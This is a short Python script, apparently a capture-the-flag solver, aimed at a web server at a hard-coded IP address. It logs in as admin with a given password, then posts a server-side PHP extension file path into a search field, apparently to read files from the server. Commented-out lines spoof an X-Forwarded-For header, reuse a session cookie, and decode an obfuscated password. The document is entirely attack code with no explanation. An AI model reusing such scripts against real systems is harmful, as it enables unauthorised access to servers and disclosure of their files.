import requests
session = requests.Session()
url = "http://134.175.185.244"
# t = requests.get(url, headers={"X-Forwarded-For": "123.123.123.123", "Referer": "https://www.google.com"})
t = session.post(url, {"username":"admin", "password":"goodlucktoyou"}) #  , headers={"Cookie": "PHPSESSID=3qdp9vmpddi8uerr4t7hl867dj"})
print(t.content.decode())
url = "http://134.175.185.244/select.php"

t = session.post(url, {"search": "/usr/local/lib/php/extensions/no-debug-non-zts-20170718/Minclude.so"}) #  , headers={"Cookie": "PHPSESSID=3qdp9vmpddi8uerr4t7hl867dj"})
print(t.text)
"""pass_enc = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
tab = pass_enc.split(',')
print(tab)
tab = [chr(int(i)) for i in tab]
print("".join(tab))
print(''.join(chr(int(i)) for i in "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30".split(',')))
"""